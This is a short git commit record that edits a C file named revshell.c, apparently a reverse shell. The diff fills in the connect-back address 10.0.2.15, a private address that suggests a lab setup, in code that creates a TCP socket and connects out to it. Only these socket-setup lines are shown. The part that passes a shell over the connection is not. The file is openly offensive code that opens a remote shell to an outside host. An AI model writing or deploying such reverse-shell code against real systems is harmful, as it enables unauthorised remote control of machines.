8ed2835889e0e3d1f171a2c6a3cab70e66836bd5
Aftermath-1 <59237021+Aftermath-1@users.noreply.github.com>
2024-06-12 02:11:06 +0200

    Update revshell.c

--- revshell.c
+++ revshell.c
@@ -12,7 +12,7 @@ int main(void){
     int sockt = socket(AF_INET, SOCK_STREAM, 0);
     revsockaddr.sin_family = AF_INET;       
     revsockaddr.sin_port = htons(port);
-    revsockaddr.sin_addr.s_addr = inet_addr("");
+    revsockaddr.sin_addr.s_addr = inet_addr("10.0.2.15");
 
     connect(sockt, (struct sockaddr *) &revsockaddr, 
     sizeof(revsockaddr));
